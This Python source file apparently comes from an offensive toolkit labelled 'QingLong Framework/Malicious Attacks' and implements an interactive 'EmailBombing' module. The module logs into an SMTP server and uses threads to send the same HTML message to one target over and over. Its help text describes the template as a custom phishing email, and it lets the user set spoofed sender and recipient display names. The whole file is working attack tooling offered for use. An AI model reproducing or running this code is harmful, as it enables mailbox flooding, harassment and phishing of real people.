import os
import sys
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory
import smtplib
from email.mime.text import MIMEText
from email.utils import formataddr
import threading

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable


class EmailBombing:
    def __init__(self):
        self.success_num = 0
        self.fail_num = 0
        commands = ["back", "show functions", "show params"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Malicious Attacks/2) > \033[0m')
        history = InMemoryHistory()
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer, history=history)
                if choice == 'back':
                    break
                elif choice == "":
                    continue
                elif choice == 'show functions':
                    self.show_functions()
                    continue
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice.split()[0] == '1':
                    param_list = choice.split()
                    self.thread_bomb(param_list[1], param_list[2], param_list[3], param_list[4], param_list[5], param_list[6], param_list[7], param_list[8], param_list[9], param_list[10])
                    continue
            except:
                print('\033[1;31;31m' + "[-] Execution failed.Please check your command and try again." + '\033[0m')
                continue

    def send_mail_bomb(self, server_mail_addr, port, from_addr, password, to_addr, template_path, subject, from_who, to_who):
        try:
            smtp = smtplib.SMTP_SSL(server_mail_addr, port=int(port))
            smtp.login(user=from_addr, password=password)
            with open(template_path, "r", encoding="utf-8") as f:
                file_content = f.read()
            message = MIMEText(file_content, "html", "utf-8")
            message["From"] = formataddr([from_who, from_addr])
            message["To"] = formataddr([to_who, to_addr])
            message["Subject"] = subject
            smtp.sendmail(from_addr=from_addr, to_addrs=to_addr, msg=message.as_string())
            smtp.quit()
            self.success_num += 1
        except:
            self.fail_num += 1

    def thread_bomb(self, server_mail_addr, port, from_addr, password, to_addr, template_path, subject, from_who, to_who, thread_num):
        print('\033[1;34;34m' + "[*] Emails are Bombing!Please be patient!" + '\033[0m')
        print('\033[1;34;34m' + "[*] source:{} => target:{} thread_num:{}".format(from_addr, to_addr, thread_num) + '\033[0m')
        for i in range(int(thread_num)):
            t1 = threading.Thread(target=self.send_mail_bomb, args=(server_mail_addr, port, from_addr, password, to_addr, template_path, subject, from_who, to_who))
            t1.start()
            t1.join()
        print('\033[1;32;32m' + "[+] The email bombing is over.success => {} fail => {}".format(self.success_num, self.fail_num) + '\033[0m')

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Email Bombing" + '\033[0m' + "\n" + '=' * len("Email Bombing") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "custom template", "1 server_mail_addr port from_addr password to_addr template_path subject from_who to_who thread_num", "使用自定义钓鱼邮件.模板格式为html"]]
        MyTable.createTable(headers, mydata)

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["server_mail_addr", "邮件服务器地址"], ["port", "邮件服务器端口"], ["from_addr", "发送方的邮箱"], ["password", "授权码"],
                  ["to_addr", "接收方邮箱"], ["template_path", "模板的绝对路径"], ["subject", "邮件标题"], ["thread_num", "同一时间发送邮件的数目"], ["from_who", "发件人"], ["to_who", "收件人"]]
        MyTable.createTable(headers, mydata)
